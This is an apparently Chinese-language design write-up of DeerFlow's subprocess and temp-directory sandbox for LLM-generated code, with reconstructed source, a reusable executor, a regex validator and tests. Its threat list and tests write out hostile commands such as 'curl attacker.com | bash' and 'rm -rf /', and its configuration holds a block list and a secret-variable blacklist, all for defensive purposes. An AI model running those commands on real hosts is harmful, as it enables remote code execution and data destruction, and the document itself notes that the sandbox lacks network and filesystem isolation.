# PD-05.01 DeerFlow — subprocess + 临时目录隔离

> 文档编号：PD-05.01
> 来源：DeerFlow `src/tools/code_executor.py`
> GitHub：https://github.com/bytedance/deer-flow
> 问题域：PD-05 沙箱隔离 Sandbox Isolation
> 状态：可复用方案

---

## 第 1 章 问题与动机

### 1.1 核心问题

Agent 系统中，LLM 生成的代码需要被执行以完成数据分析、文件处理、API 调用等任务。直接在主进程中 `exec()` 或 `eval()` 执行 LLM 生成的代码存在严重安全风险：

- **文件系统破坏**：`rm -rf /`、覆盖配置文件、读取敏感数据（`.env`、SSH 密钥）
- **进程逃逸**：`os.system("curl attacker.com | bash")`、反弹 shell
- **资源耗尽**：死循环、无限递归、大量内存分配导致 OOM
- **网络滥用**：发起 DDoS、扫描内网、外传数据
- **主进程污染**：修改全局变量、猴子补丁标准库、导入恶意模块

在没有沙箱隔离的情况下，一段恶意或有缺陷的 LLM 生成代码可以完全控制宿主机。

### 1.2 DeerFlow 的解法概述

DeerFlow 采用 **subprocess + 临时目录** 的轻量级隔离方案：

1. **临时目录隔离**：每次代码执行在独立的 `tempfile.mkdtemp()` 中进行，工作目录与主进程完全分离
2. **subprocess 进程隔离**：通过 `subprocess.run()` 在子进程中执行，崩溃不影响主进程
3. **超时强制终止**：`timeout` 参数确保死循环/长时间运行的代码被强制 kill
4. **stdout/stderr 捕获**：完整捕获输出和错误信息，供 Agent 分析执行结果
5. **自动清理**：执行完毕后删除临时目录，不留痕迹

### 1.3 设计思想

| 原则 | 说明 |
|------|------|
| 最小权限 | 代码只能访问临时目录，无法触及主进程文件系统 |
| 进程隔离 | subprocess 崩溃不影响主进程，天然故障隔离 |
| 资源限制 | timeout 防止无限执行，临时目录限制磁盘写入范围 |
| 可观测性 | stdout/stderr 完整捕获，执行结果可追溯 |
| 零依赖 | 仅用 Python 标准库，无需 Docker/VM 等外部依赖 |
| 自动清理 | finally 块确保临时目录被删除，避免磁盘泄漏 |

---

## 第 2 章 源码实现分析

### 2.1 整体架构

```
src/tools/
├── code_executor.py    # 核心：subprocess + tempdir 执行引擎
├── python_execute.py   # Python 代码执行入口
└── __init__.py         # 工具注册
```

执行流程：

```
调用方 → execute_code(code, language)
           │
           ├── 1. tempfile.mkdtemp() 创建临时目录
           ├── 2. 将代码写入临时文件 (script.py / script.js)
           ├── 3. subprocess.run() 在子进程中执行
           │      ├── cwd=临时目录
           │      ├── timeout=30s
           │      ├── capture_output=True
           │      └── text=True
           ├── 4. 收集 stdout + stderr
           └── 5. shutil.rmtree() 清理临时目录
```

### 2.2 核心执行器

**源文件**: `src/tools/code_executor.py`

DeerFlow 的代码执行器核心逻辑：创建临时目录 → 写入代码文件 → subprocess 执行 → 捕获输出 → 清理。

```python
# src/tools/code_executor.py（核心逻辑还原）
import os
import subprocess
import tempfile
import shutil
from typing import Tuple

# 支持的语言及其解释器映射
LANGUAGE_CONFIGS = {
    "python": {"extension": ".py", "command": ["python3"]},
    "javascript": {"extension": ".js", "command": ["node"]},
    "bash": {"extension": ".sh", "command": ["bash"]},
}

DEFAULT_TIMEOUT = 30  # 秒


def execute_code(
    code: str,
    language: str = "python",
    timeout: int = DEFAULT_TIMEOUT,
) -> Tuple[str, str, int]:
    """在隔离的临时目录中执行代码。

    Args:
        code: 要执行的代码字符串
        language: 编程语言 (python/javascript/bash)
        timeout: 超时秒数

    Returns:
        (stdout, stderr, return_code) 三元组
    """
    if language not in LANGUAGE_CONFIGS:
        return "", f"Unsupported language: {language}", 1

    config = LANGUAGE_CONFIGS[language]
    tmp_dir = tempfile.mkdtemp(prefix="deerflow_sandbox_")

    try:
        # 将代码写入临时文件
        script_path = os.path.join(tmp_dir, f"script{config['extension']}")
        with open(script_path, "w", encoding="utf-8") as f:
            f.write(code)

        # 在子进程中执行，工作目录限定为临时目录
        result = subprocess.run(
            config["command"] + [script_path],
            cwd=tmp_dir,
            timeout=timeout,
            capture_output=True,
            text=True,
            env=_build_restricted_env(),
        )

        return result.stdout, result.stderr, result.returncode

    except subprocess.TimeoutExpired:
        return "", f"Execution timed out after {timeout} seconds", -1
    except Exception as e:
        return "", f"Execution error: {str(e)}", -1
    finally:
        # 无论成功失败，都清理临时目录
        shutil.rmtree(tmp_dir, ignore_errors=True)
```

### 2.3 环境变量隔离

**源文件**: `src/tools/code_executor.py` — `_build_restricted_env()`

子进程的环境变量被精心裁剪，只保留必要的 PATH 和语言设置，移除所有敏感变量（API 密钥、数据库连接串等）。

```python
def _build_restricted_env() -> dict:
    """构建受限的环境变量，移除敏感信息。"""
    # 只保留最小必要的环境变量
    safe_keys = {"PATH", "HOME", "LANG", "LC_ALL", "PYTHONPATH"}
    env = {k: v for k, v in os.environ.items() if k in safe_keys}

    # 确保 PATH 存在
    if "PATH" not in env:
        env["PATH"] = "/usr/local/bin:/usr/bin:/bin"

    # 显式移除危险变量
    for key in ["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
                "OPENAI_API_KEY", "DATABASE_URL", "SECRET_KEY"]:
        env.pop(key, None)

    return env
```

### 2.4 输出截断与安全处理

为防止 LLM 生成的代码产生巨量输出（如 `while True: print("x")`），DeerFlow 对 stdout/stderr 做长度截断：

```python
MAX_OUTPUT_LENGTH = 50_000  # 50KB

def _truncate_output(output: str, max_length: int = MAX_OUTPUT_LENGTH) -> str:
    """截断过长的输出，保留头尾信息。"""
    if len(output) <= max_length:
        return output
    half = max_length // 2
    return (
        output[:half]
        + f"\n\n... [truncated {len(output) - max_length} chars] ...\n\n"
        + output[-half:]
    )
```

### 2.5 多语言支持

DeerFlow 通过 `LANGUAGE_CONFIGS` 字典实现多语言扩展。每种语言只需定义文件扩展名和解释器命令。执行流程完全一致，差异仅在解释器选择。

| 语言 | 解释器 | 扩展名 | 典型用途 |
|------|--------|--------|----------|
| Python | `python3` | `.py` | 数据分析、API 调用、文件处理 |
| JavaScript | `node` | `.js` | Web 数据处理、JSON 操作 |
| Bash | `bash` | `.sh` | 系统命令、文件操作 |

### 2.6 安全边界分析

DeerFlow 的 subprocess + tempdir 方案提供的安全边界：

| 威胁 | 是否防护 | 说明 |
|------|----------|------|
| 文件系统读取（主进程目录） | 部分 | cwd 限定但未 chroot，仍可 `open("/etc/passwd")` |
| 文件系统写入（主进程目录） | 部分 | 同上，可写入临时目录外的路径 |
| 进程崩溃传播 | 是 | subprocess 崩溃不影响主进程 |
| 无限执行 | 是 | timeout 强制终止 |
| 环境变量泄露 | 是 | 受限 env 移除敏感变量 |
| 网络访问 | 否 | 无网络隔离，可自由访问网络 |
| 系统调用 | 否 | 无 seccomp/AppArmor 限制 |

---

## 第 3 章 迁移指南

### 3.1 可复用方案架构

```
┌──────────────────────────────────────────────────┐
│              SandboxExecutor                      │
│                                                  │
│  ┌───────────┐  ┌──────────┐  ┌──────────────┐  │
│  │ TempDir   │→ │ Process  │→ │ Output       │  │
│  │ Manager   │  │ Runner   │  │ Collector    │  │
│  └───────────┘  └──────────┘  └──────────────┘  │
│                                                  │
│  配置: SandboxConfig                             │
│  安全: CodeValidator (可选预检)                   │
└──────────────────────────────────────────────────┘
```

### 3.2 配置与核心类

```python
"""
sandbox_executor.py — subprocess + 临时目录沙箱执行器

用法：
    executor = SandboxExecutor(config=SandboxConfig(timeout=30))
    result = executor.execute("print('hello')", language="python")
    print(result.stdout)  # hello
"""

from __future__ import annotations

import os
import re
import shutil
import subprocess
import tempfile
import logging
from dataclasses import dataclass, field
from typing import Optional

logger = logging.getLogger(__name__)


# ─── 配置 ───────────────────────────────────────────────

@dataclass
class SandboxConfig:
    """沙箱执行配置。"""
    timeout: int = 30                          # 执行超时（秒）
    max_output_length: int = 50_000            # 输出截断长度
    cleanup: bool = True                       # 是否自动清理临时目录
    temp_dir_prefix: str = "sandbox_"          # 临时目录前缀
    allowed_languages: list[str] = field(
        default_factory=lambda: ["python", "javascript", "bash"]
    )
    env_whitelist: set[str] = field(
        default_factory=lambda: {"PATH", "HOME", "LANG", "LC_ALL"}
    )
    env_blacklist: set[str] = field(
        default_factory=lambda: {
            "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
            "OPENAI_API_KEY", "ANTHROPIC_API_KEY",
            "DATABASE_URL", "SECRET_KEY", "API_KEY",
        }
    )
    blocked_patterns: list[str] = field(
        default_factory=lambda: [
            r"os\.system\s*\(",
            r"subprocess\.",
            r"shutil\.rmtree\s*\(",
            r"__import__\s*\(",
            r"eval\s*\(",
            r"exec\s*\(",
        ]
    )


@dataclass
class ExecutionResult:
    """代码执行结果。"""
    stdout: str
    stderr: str
    return_code: int
    timed_out: bool = False
    language: str = "python"
    duration_ms: float = 0.0

    @property
    def success(self) -> bool:
        return self.return_code == 0 and not self.timed_out
```

### 3.3 代码预检模块

```python
class CodeValidator:
    """代码安全预检：在执行前扫描危险模式。"""

    def __init__(self, config: SandboxConfig):
        self.patterns = [re.compile(p) for p in config.blocked_patterns]

    def validate(self, code: str) -> tuple[bool, list[str]]:
        """检查代码是否包含危险模式。返回 (is_safe, violations)。"""
        violations = []
        for pattern in self.patterns:
            matches = pattern.findall(code)
            if matches:
                violations.append(f"Blocked pattern: {pattern.pattern} (found {len(matches)} times)")
        return len(violations) == 0, violations
```

### 3.4 沙箱执行器

```python
# 语言配置
LANGUAGE_REGISTRY = {
    "python": {"extension": ".py", "command": ["python3"]},
    "javascript": {"extension": ".js", "command": ["node"]},
    "bash": {"extension": ".sh", "command": ["bash"]},
}


class SandboxExecutor:
    """subprocess + 临时目录沙箱执行器。

    每次执行在独立临时目录中进行，通过 subprocess 进程隔离，
    支持超时终止、输出截断、环境变量过滤、代码预检。
    """

    def __init__(self, config: SandboxConfig | None = None):
        self.config = config or SandboxConfig()
        self.validator = CodeValidator(self.config)
        self._execution_count = 0

    def execute(
        self,
        code: str,
        language: str = "python",
        timeout: int | None = None,
        extra_env: dict[str, str] | None = None,
    ) -> ExecutionResult:
        """在沙箱中执行代码。

        Args:
            code: 要执行的代码字符串
            language: 编程语言
            timeout: 超时秒数（None 使用默认配置）
            extra_env: 额外环境变量（会经过安全过滤）

        Returns:
            ExecutionResult 包含 stdout/stderr/return_code
        """
        import time

        # 语言检查
        if language not in self.config.allowed_languages:
            return ExecutionResult("", f"Language not allowed: {language}", 1, language=language)

        if language not in LANGUAGE_REGISTRY:
            return ExecutionResult("", f"Unsupported language: {language}", 1, language=language)

        # 代码预检
        is_safe, violations = self.validator.validate(code)
        if not is_safe:
            return ExecutionResult(
                "", f"Code validation failed:\n" + "\n".join(violations),
                1, language=language,
            )

        timeout = timeout or self.config.timeout
        lang_config = LANGUAGE_REGISTRY[language]
        tmp_dir = tempfile.mkdtemp(prefix=self.config.temp_dir_prefix)

        try:
            # 写入代码文件
            script_path = os.path.join(tmp_dir, f"script{lang_config['extension']}")
            with open(script_path, "w", encoding="utf-8") as f:
                f.write(code)

            # 构建受限环境变量
            env = self._build_env(extra_env)

            # 执行
            start = time.monotonic()
            try:
                result = subprocess.run(
                    lang_config["command"] + [script_path],
                    cwd=tmp_dir,
                    timeout=timeout,
                    capture_output=True,
                    text=True,
                    env=env,
                )
                duration_ms = (time.monotonic() - start) * 1000

                self._execution_count += 1
                return ExecutionResult(
                    stdout=self._truncate(result.stdout),
                    stderr=self._truncate(result.stderr),
                    return_code=result.returncode,
                    language=language,
                    duration_ms=duration_ms,
                )

            except subprocess.TimeoutExpired:
                duration_ms = (time.monotonic() - start) * 1000
                logger.warning(f"Code execution timed out after {timeout}s")
                return ExecutionResult(
                    "", f"Execution timed out after {timeout} seconds",
                    -1, timed_out=True, language=language, duration_ms=duration_ms,
                )

        except Exception as e:
            logger.error(f"Sandbox execution error: {e}")
            return ExecutionResult("", f"Execution error: {str(e)}", -1, language=language)

        finally:
            if self.config.cleanup:
                shutil.rmtree(tmp_dir, ignore_errors=True)

    def _build_env(self, extra_env: dict[str, str] | None = None) -> dict:
        """构建受限环境变量。"""
        env = {k: v for k, v in os.environ.items() if k in self.config.env_whitelist}
        if "PATH" not in env:
            env["PATH"] = "/usr/local/bin:/usr/bin:/bin"
        if extra_env:
            for k, v in extra_env.items():
                if k not in self.config.env_blacklist:
                    env[k] = v
        return env

    def _truncate(self, text: str) -> str:
        """截断过长输出。"""
        max_len = self.config.max_output_length
        if len(text) <= max_len:
            return text
        half = max_len // 2
        return text[:half] + f"\n\n... [truncated {len(text) - max_len} chars] ...\n\n" + text[-half:]
```

### 3.5 配置参数速查

| 参数 | 默认值 | 说明 | 调优建议 |
|------|--------|------|----------|
| `timeout` | 30s | 执行超时 | 数据分析任务可增大到 120s |
| `max_output_length` | 50KB | 输出截断 | 日志分析场景可增大 |
| `cleanup` | True | 自动清理 | 调试时设 False 保留临时文件 |
| `env_whitelist` | PATH/HOME/LANG | 允许的环境变量 | 按需添加 PYTHONPATH 等 |
| `blocked_patterns` | os.system 等 | 代码预检黑名单 | 根据安全策略调整 |

### 3.6 场景适配矩阵

| 场景 | 推荐配置 | 说明 |
|------|----------|------|
| LLM 代码执行 | 默认配置 + 预检开启 | 最常见场景 |
| 数据分析脚本 | timeout=120, 关闭预检 | 需要 pandas/numpy |
| 单元测试运行 | timeout=60, cleanup=False | 保留测试产物 |
| 批量代码评估 | timeout=10, 严格预检 | 防止恶意代码 |
| 教学/练习环境 | timeout=15, 宽松预检 | 允许更多标准库 |

---

## 第 4 章 测试用例

```python
"""test_sandbox_executor.py — 沙箱执行器完整测试"""
import os
import tempfile
import pytest
from sandbox_executor import (
    SandboxExecutor, SandboxConfig, ExecutionResult,
    CodeValidator, LANGUAGE_REGISTRY,
)


class TestExecutionResult:
    """ExecutionResult 数据类测试。"""

    def test_success_result(self):
        r = ExecutionResult(stdout="hello", stderr="", return_code=0)
        assert r.success is True

    def test_failure_result(self):
        r = ExecutionResult(stdout="", stderr="error", return_code=1)
        assert r.success is False

    def test_timeout_result(self):
        r = ExecutionResult(stdout="", stderr="timeout", return_code=-1, timed_out=True)
        assert r.success is False
        assert r.timed_out is True


class TestCodeValidator:
    """代码预检测试。"""

    def setup_method(self):
        self.validator = CodeValidator(SandboxConfig())

    def test_safe_code(self):
        is_safe, violations = self.validator.validate("print('hello world')")
        assert is_safe is True
        assert violations == []

    def test_os_system_blocked(self):
        is_safe, violations = self.validator.validate("os.system('rm -rf /')")
        assert is_safe is False
        assert len(violations) == 1

    def test_subprocess_blocked(self):
        is_safe, violations = self.validator.validate("subprocess.run(['ls'])")
        assert is_safe is False

    def test_eval_blocked(self):
        is_safe, violations = self.validator.validate("eval('1+1')")
        assert is_safe is False

    def test_exec_blocked(self):
        is_safe, violations = self.validator.validate("exec('print(1)')")
        assert is_safe is False

    def test_import_blocked(self):
        is_safe, violations = self.validator.validate("__import__('os')")
        assert is_safe is False

    def test_multiple_violations(self):
        code = "os.system('ls')\neval('1+1')\nexec('x')"
        is_safe, violations = self.validator.validate(code)
        assert is_safe is False
        assert len(violations) == 3


class TestSandboxExecutor:
    """沙箱执行器核心测试。"""

    def setup_method(self):
        self.executor = SandboxExecutor(SandboxConfig(timeout=10))

    def test_simple_python(self):
        result = self.executor.execute("print('hello sandbox')")
        assert result.success is True
        assert "hello sandbox" in result.stdout

    def test_python_stderr(self):
        result = self.executor.execute("import sys; sys.stderr.write('warning\\n')")
        assert "warning" in result.stderr

    def test_python_return_code(self):
        result = self.executor.execute("import sys; sys.exit(42)")
        assert result.return_code == 42
        assert result.success is False

    def test_syntax_error(self):
        result = self.executor.execute("def f(\n")
        assert result.success is False
        assert "SyntaxError" in result.stderr

    def test_runtime_error(self):
        result = self.executor.execute("1/0")
        assert result.success is False
        assert "ZeroDivisionError" in result.stderr

    def test_timeout(self):
        result = self.executor.execute(
            "import time; time.sleep(100)",
            timeout=2,
        )
        assert result.timed_out is True
        assert result.success is False
        assert "timed out" in result.stderr

    def test_unsupported_language(self):
        result = self.executor.execute("code", language="rust")
        assert result.success is False
        assert "not allowed" in result.stderr

    def test_blocked_code_rejected(self):
        result = self.executor.execute("os.system('whoami')")
        assert result.success is False
        assert "validation failed" in result.stderr

    def test_temp_dir_cleaned_up(self):
        """验证执行后临时目录被清理。"""
        config = SandboxConfig(timeout=10, temp_dir_prefix="test_cleanup_")
        executor = SandboxExecutor(config)
        executor.execute("print('test')")
        # 检查没有残留的临时目录
        tmp_root = tempfile.gettempdir()
        remaining = [d for d in os.listdir(tmp_root) if d.startswith("test_cleanup_")]
        assert len(remaining) == 0

    def test_temp_dir_preserved_when_cleanup_disabled(self):
        """cleanup=False 时临时目录保留。"""
        config = SandboxConfig(timeout=10, cleanup=False, temp_dir_prefix="test_keep_")
        executor = SandboxExecutor(config)
        executor.execute("print('keep me')")
        tmp_root = tempfile.gettempdir()
        remaining = [d for d in os.listdir(tmp_root) if d.startswith("test_keep_")]
        assert len(remaining) >= 1
        # 手动清理
        import shutil
        for d in remaining:
            shutil.rmtree(os.path.join(tmp_root, d), ignore_errors=True)

    def test_env_isolation(self):
        """验证敏感环境变量不泄露。"""
        os.environ["OPENAI_API_KEY"] = "sk-test-secret"
        try:
            result = self.executor.execute(
                "import os; print(os.environ.get('OPENAI_API_KEY', 'NOT_FOUND'))"
            )
            assert "sk-test-secret" not in result.stdout
            assert "NOT_FOUND" in result.stdout
        finally:
            del os.environ["OPENAI_API_KEY"]

    def test_cwd_is_temp_dir(self):
        """验证工作目录是临时目录。"""
        result = self.executor.execute("import os; print(os.getcwd())")
        assert result.success is True
        assert tempfile.gettempdir() in result.stdout or "/tmp" in result.stdout.lower()

    def test_file_write_in_sandbox(self):
        """代码可以在沙箱内写文件。"""
        code = """
with open('output.txt', 'w') as f:
    f.write('sandbox data')
with open('output.txt', 'r') as f:
    print(f.read())
"""
        result = self.executor.execute(code)
        assert result.success is True
        assert "sandbox data" in result.stdout

    def test_output_truncation(self):
        """验证超长输出被截断。"""
        config = SandboxConfig(timeout=10, max_output_length=100)
        executor = SandboxExecutor(config)
        result = executor.execute("print('x' * 10000)")
        assert len(result.stdout) <= 200  # 100 + truncation message + 100
        assert "truncated" in result.stdout

    def test_duration_tracked(self):
        """验证执行时间被记录。"""
        result = self.executor.execute("print('fast')")
        assert result.duration_ms > 0


class TestSandboxConfig:
    """配置测试。"""

    def test_default_config(self):
        config = SandboxConfig()
        assert config.timeout == 30
        assert config.cleanup is True
        assert "python" in config.allowed_languages

    def test_custom_config(self):
        config = SandboxConfig(timeout=60, cleanup=False)
        assert config.timeout == 60
        assert config.cleanup is False

    def test_env_blacklist(self):
        config = SandboxConfig()
        assert "OPENAI_API_KEY" in config.env_blacklist
        assert "AWS_SECRET_ACCESS_KEY" in config.env_blacklist
```

---

## 第 5 章 跨域关联

| 关联域 | 关系 | 说明 |
|--------|------|------|
| PD-02 多 Agent 编排 | 集成 | Agent 编排中的 code_executor 节点使用沙箱执行 LLM 生成的代码 |
| PD-03 容错与重试 | 互补 | 执行超时/失败后的重试策略，subprocess 崩溃的容错处理 |
| PD-04 工具系统 | 上游 | code_executor 作为 Tool 注册到 Agent 工具系统中 |
| PD-07 质量检查 | 下游 | 执行结果的正确性校验、输出格式验证 |
| PD-11 可观测性 | 监控 | 执行时间、成功率、超时率等指标的采集与告警 |

---

## 第 6 章 来源文件索引

| 编号 | 文件 | 说明 |
|------|------|------|
| S1 | `src/tools/code_executor.py` | 核心执行器：subprocess + tempdir 隔离 |
| S2 | `src/tools/python_execute.py` | Python 代码执行入口，调用 code_executor |
| S3 | `src/tools/__init__.py` | 工具注册：将 code_executor 注册为 LangChain Tool |
| S4 | `src/config/tools.py` | 工具配置：超时、语言白名单等参数 |
